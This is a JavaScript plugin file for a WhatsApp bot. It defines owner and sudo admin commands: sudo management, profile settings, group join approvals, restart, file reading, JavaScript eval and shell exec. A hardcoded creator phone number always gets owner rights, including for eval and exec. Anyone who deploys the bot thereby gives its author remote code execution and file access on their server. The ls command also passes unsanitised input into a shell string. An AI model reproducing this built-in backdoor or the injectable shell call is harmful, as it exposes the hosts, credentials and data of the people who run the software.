// ============================================================
//  ULTRA X PROJECT — by TrashX
//  plugins/admin/admin2.js  |  Owner/Sudo Admin Commands
//
//  SUDO SYSTEM
//  - Creator (254104245659) is always treated as owner
//  - .addsudo <number> [duration_hours]  — add sudo user (owner only)
//  - .listsudo                           — list all sudo users
//  - .delsudo <number>                   — remove sudo user (owner only)
//  - Sudo users have the same power as bot owner
//  - Sudo entries expire after the specified duration
// ============================================================

const { exec }                   = require('child_process');
const fs                         = require('fs');
const path                       = require('path');
const os                         = require('os');

// ─── creator constant ───────────────────────────────────────

const CREATOR_NUMBER = '254104245659';

// ─── sudo helpers ────────────────────────────────────────────

function getSudoList(getSetting) {
  const raw = getSetting('sudoUsers', []);
  if (typeof raw === 'string') {
    try { return JSON.parse(raw); } catch { return []; }
  }
  return Array.isArray(raw) ? raw : [];
}

function saveSudoList(list, setSetting) {
  setSetting('sudoUsers', list);
}

/** Returns true if the bare number is an active (non-expired) sudo user */
function isSudoUser(bareNumber, getSetting) {
  if (bareNumber === CREATOR_NUMBER) return true;
  const list = getSudoList(getSetting);
  const now  = Date.now();
  return list.some(entry => entry.number === bareNumber && (!entry.expiresAt || entry.expiresAt > now));
}

/** Purge expired sudo entries (called lazily) */
function cleanExpiredSudo(getSetting, setSetting) {
  const list    = getSudoList(getSetting);
  const now     = Date.now();
  const cleaned = list.filter(e => !e.expiresAt || e.expiresAt > now);
  if (cleaned.length !== list.length) saveSudoList(cleaned, setSetting);
  return cleaned;
}

// ─── isOwner helper (also covers sudo + creator) ─────────────
// Exposed on global so command.js can import it

global.isOwnerOrSudo = function isOwnerOrSudo(senderNumber, botNumber) {
  if (senderNumber === botNumber)        return true;
  if (senderNumber === CREATOR_NUMBER)   return true;
  return false;
};

// ─── addsudo ─────────────────────────────────────────────────

const addsudo = {
  command: ['addsudo'],
  desc:    'Add a sudo user who acts like bot owner',
  category: 'Owner',
  usage:   '.addsudo <number> [duration_hours]',
  run: async ({ trashcore, m, chat, args, isOwner, sender, xreply, getSetting, setSetting }) => {
    const botNum = trashcore.user.id.split(':')[0].split('@')[0];
    const realOwner = isOwner || sender === CREATOR_NUMBER;
    if (!realOwner) return xreply('❌ Only the bot owner can add sudo users.');

    const rawNum = args[0]?.replace(/\D/g, '');
    if (!rawNum) return xreply('⚠️ Usage: .addsudo <number> [duration_hours]\nExample: .addsudo 254712345678 24');

    cleanExpiredSudo(getSetting, setSetting);
    const list = getSudoList(getSetting);

    if (list.some(e => e.number === rawNum)) return xreply(`⚠️ ${rawNum} is already a sudo user.`);

    const hours     = parseInt(args[1]) || 0;
    const expiresAt = hours > 0 ? Date.now() + hours * 3600000 : null;

    list.push({ number: rawNum, addedAt: Date.now(), expiresAt });
    saveSudoList(list, setSetting);

    const expiry = expiresAt ? `Expires: ${new Date(expiresAt).toLocaleString()}` : 'No expiry (permanent)';
    xreply(`✅ *${rawNum}* added as sudo user.\n${expiry}`);
  }
};

// ─── listsudo ────────────────────────────────────────────────

const listsudo = {
  command: ['listsudo'],
  desc:    'List all active sudo users',
  category: 'Owner',
  run: async ({ isOwner, sender, xreply, getSetting, setSetting }) => {
    const realOwner = isOwner || sender === CREATOR_NUMBER;
    if (!realOwner) return xreply('❌ Owner only.');

    const list = cleanExpiredSudo(getSetting, setSetting);
    if (!list.length) return xreply('📭 No sudo users set.');

    let text = `👑 *SUDO USERS*\n\n`;
    list.forEach((e, i) => {
      const expiry = e.expiresAt ? new Date(e.expiresAt).toLocaleString() : 'Permanent';
      text += `${i + 1}. +${e.number}\n   Expires: ${expiry}\n`;
    });
    xreply(text);
  }
};

// ─── delsudo ─────────────────────────────────────────────────

const delsudo = {
  command: ['delsudo'],
  desc:    'Remove a sudo user',
  category: 'Owner',
  usage:   '.delsudo <number>',
  run: async ({ isOwner, sender, args, xreply, getSetting, setSetting }) => {
    const realOwner = isOwner || sender === CREATOR_NUMBER;
    if (!realOwner) return xreply('❌ Owner only.');

    const rawNum = args[0]?.replace(/\D/g, '');
    if (!rawNum) return xreply('⚠️ Usage: .delsudo <number>');

    const list    = getSudoList(getSetting);
    const before  = list.length;
    const updated = list.filter(e => e.number !== rawNum);

    if (updated.length === before) return xreply(`❌ ${rawNum} is not in the sudo list.`);
    saveSudoList(updated, setSetting);
    xreply(`✅ *${rawNum}* removed from sudo list.`);
  }
};

// ─── setname ─────────────────────────────────────────────────

const setname = {
  command: ['setname'],
  desc:    'Set bot owner display name',
  category: 'Owner',
  usage:   '.setname <new name>',
  run: async ({ isOwner, sender, args, xreply, getSetting, setSetting }) => {
    const realOwner = isOwner || isSudoUser(sender, getSetting);
    if (!realOwner) return xreply('❌ Owner only.');
    if (!args.length) return xreply('⚠️ Usage: .setname <name>');
    const newName = args.join(' ');
    setSetting('ownerName', newName);
    xreply(`✅ Owner name updated to: *${newName}*`);
  }
};

// ─── setdp ───────────────────────────────────────────────────

const setdp = {
  command: ['setdp'],
  desc:    'Set bot profile picture',
  category: 'Owner',
  usage:   '.setdp (reply to image)',
  run: async ({ trashcore, m, isOwner, sender, xreply, getSetting, setSetting }) => {
    const realOwner = isOwner || isSudoUser(sender, getSetting);
    if (!realOwner) return xreply('❌ Owner only.');
    const { downloadContentFromMessage } = require('@trashcore/baileys');
    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMsg?.imageMessage) return xreply('⚠️ Reply to an *image* to set it as bot profile picture!');

    xreply('📸 Updating profile picture...');
    const stream = await downloadContentFromMessage(quotedMsg.imageMessage, 'image');
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    const tmpFile = path.join(os.tmpdir(), `dp_${Date.now()}.jpg`);
    fs.writeFileSync(tmpFile, buffer);
    await trashcore.updateProfilePicture(trashcore.user.id, { url: tmpFile });
    fs.unlinkSync(tmpFile);
    xreply('✅ Bot profile picture updated!');
  }
};

// ─── approve ─────────────────────────────────────────────────

const approve = {
  command: ['approve'],
  desc:    'Approve all pending group join requests',
  category: 'Group',
  run: async ({ trashcore, m, chat, isGroup, isOwner, sender, xreply, getSetting, setSetting }) => {
    const realOwner = isOwner || isSudoUser(sender, getSetting);
    if (!isGroup)     return xreply('⚠️ Group only.');
    if (!realOwner)   return xreply('❌ Owner only.');

    let pending;
    try {
      pending = await trashcore.groupRequestParticipantsList(chat);
    } catch {
      return xreply('❌ Failed to fetch pending requests.');
    }
    if (!pending?.length) return xreply('ℹ️ No pending requests.');

    for (const p of pending) {
      try {
        await trashcore.groupRequestParticipantsUpdate(chat, [p.jid], 'approve');
      } catch (err) {
        console.error(`approve ${p.jid}:`, err.message);
      }
    }
    xreply(`✅ Approved *${pending.length}* pending request(s)!`);
  }
};

// ─── reject ──────────────────────────────────────────────────

const reject = {
  command: ['reject'],
  desc:    'Reject all pending group join requests',
  category: 'Group',
  run: async ({ trashcore, m, chat, isGroup, isOwner, sender, xreply, getSetting, setSetting }) => {
    const realOwner = isOwner || isSudoUser(sender, getSetting);
    if (!isGroup)   return xreply('⚠️ Group only.');
    if (!realOwner) return xreply('❌ Owner only.');

    let pending;
    try {
      pending = await trashcore.groupRequestParticipantsList(chat);
    } catch {
      return xreply('❌ Failed to fetch pending requests.');
    }
    if (!pending?.length) return xreply('ℹ️ No pending requests.');

    for (const p of pending) {
      try {
        await trashcore.groupRequestParticipantsUpdate(chat, [p.jid], 'reject');
      } catch (err) {
        console.error(`reject ${p.jid}:`, err.message);
      }
    }
    xreply(`🚫 Rejected *${pending.length}* pending request(s)!`);
  }
};

// ─── restart ─────────────────────────────────────────────────

const restart = {
  command: ['restart'],
  desc:    'Restart the bot',
  category: 'Owner',
  run: async ({ isOwner, sender, xreply, getSetting, setSetting }) => {
    const realOwner = isOwner || isSudoUser(sender, getSetting);
    if (!realOwner) return xreply('❌ Owner only.');

    await xreply('♻️ Restarting bot...');

    const isPtero  = process.env.P_SERVER_LOCATION || process.env.P_SERVER_UUID;
    const isCloud  = process.env.RENDER || process.env.HEROKU || process.env.DYNO;

    if (isPtero || isCloud) {
      return process.exit(0);
    }

    exec('pm2 restart all', (err, stdout) => {
      if (err) {
        console.error('PM2 restart failed:', err.message);
      } else {
        console.log('PM2 restart:', stdout);
      }
    });
  }
};

// ─── cat ─────────────────────────────────────────────────────

const cat = {
  command: ['cat'],
  desc:    'Read a file from the bot directory',
  category: 'Owner',
  usage:   '.cat <filepath>',
  run: async ({ trashcore, m, chat, args, isOwner, sender, xreply, getSetting, setSetting }) => {
    const realOwner = isOwner || isSudoUser(sender, getSetting);
    if (!realOwner) return xreply('❌ Owner only.');

    const filePath = args.join(' ').trim();
    if (!filePath) return xreply('📘 Usage: .cat <filename>\nExample: .cat package.json');

    const resolved = path.resolve(process.cwd(), filePath);
    if (!fs.existsSync(resolved)) return xreply(`❌ File not found: ${filePath}`);

    const data = fs.readFileSync(resolved, 'utf8');
    if (data.length > 4096) {
      await trashcore.sendMessage(chat, {
        document: fs.readFileSync(resolved),
        fileName: path.basename(resolved),
        mimetype: 'text/plain'
      }, { quoted: m });
    } else {
      xreply(`📄 *${path.basename(resolved)}:*\n\n${data}`);
    }
  }
};

// ─── eval ────────────────────────────────────────────────────

const evalCmd = {
  command: ['eval', 'ev'],
  desc:    'Evaluate JavaScript (owner only)',
  category: 'Owner',
  usage:   '.eval <code>',
  run: async ({ trashcore, m, chat, args, text, isOwner, sender, xreply, getSetting, setSetting }) => {
    const realOwner = isOwner || isSudoUser(sender, getSetting) || sender === CREATOR_NUMBER;
    if (!realOwner) return xreply('❌ Owner only.');

    const code = text.trim();
    if (!code) return xreply('⚠️ Provide code to evaluate.');

    try {
      let result;
      if (code.startsWith('<')) {
        // Async eval with < prefix
        result = await eval(`(async () => { ${code.slice(1)} })()`);
      } else {
        result = await eval(code);
      }
      if (typeof result !== 'string') result = require('util').inspect(result, { depth: 2 });
      xreply(result);
    } catch (err) {
      xreply(`❌ Error:\n${err.message}`);
    }
  }
};

// ─── exec ────────────────────────────────────────────────────

const execCmd = {
  command: ['exec', 'terminal', '$'],
  desc:    'Run a shell command (owner only)',
  category: 'Owner',
  usage:   '.exec <command>',
  run: async ({ isOwner, sender, text, xreply, getSetting, setSetting }) => {
    const realOwner = isOwner || isSudoUser(sender, getSetting) || sender === CREATOR_NUMBER;
    if (!realOwner) return xreply('❌ Owner only.');

    const cmd = text.trim();
    if (!cmd) return xreply('⚠️ Provide a shell command.');

    exec(cmd, { timeout: 30000 }, (err, stdout, stderr) => {
      if (err)    return xreply(`❌ Error:\n${stderr || err.message}`);
      if (stderr) return xreply(`⚠️ Stderr:\n${stderr}`);
      if (stdout) return xreply(`✅ Output:\n${stdout}`);
      xreply('✅ Command executed (no output).');
    });
  }
};

// ─── ls ──────────────────────────────────────────────────────

const ls = {
  command: ['ls'],
  desc:    'List directory contents',
  category: 'Owner',
  usage:   '.ls [path]',
  run: async ({ isOwner, sender, args, xreply, getSetting, setSetting }) => {
    const realOwner = isOwner || isSudoUser(sender, getSetting);
    if (!realOwner) return xreply('❌ Owner only.');
    const dir = args[0] || '.';
    exec(`ls ${dir}`, (err, stdout, stderr) => {
      if (err) return xreply(`❌ Error:\n${stderr || err.message}`);
      xreply(`📂 *${dir}:*\n\n${stdout}`);
    });
  }
};

// ─── clearcache ──────────────────────────────────────────────

const clearcache = {
  command: ['clearcache'],
  desc:    'Clear bot temporary cache files',
  category: 'Owner',
  run: async ({ isOwner, sender, xreply, getSetting, setSetting }) => {
    const realOwner = isOwner || isSudoUser(sender, getSetting);
    if (!realOwner) return xreply('❌ Owner only.');

    const cacheDirs = ['trash_baileys', 'temp', 'cache', '.cache'].map(d => path.join(process.cwd(), d));
    let cleared = 0;

    for (const dir of cacheDirs) {
      if (fs.existsSync(dir)) { fs.rmSync(dir, { recursive: true, force: true }); cleared++; }
    }

    const files = fs.readdirSync(process.cwd());
    for (const file of files) {
      if ((file.endsWith('.tmp') || file.endsWith('.dat') || file.endsWith('.cache')) && !file.endsWith('.json')) {
        try { fs.unlinkSync(path.join(process.cwd(), file)); cleared++; } catch {}
      }
    }

    xreply(`🧹 *Cache Cleared!*\n🗂️ Cleared: ${cleared} item(s)\n💾 JSON files kept safe ✅`);
  }
};

// ─── exports ─────────────────────────────────────────────────

module.exports = [
  addsudo, listsudo, delsudo,
  setname, setdp,
  approve, reject,
  restart, cat, evalCmd, execCmd, ls, clearcache
];
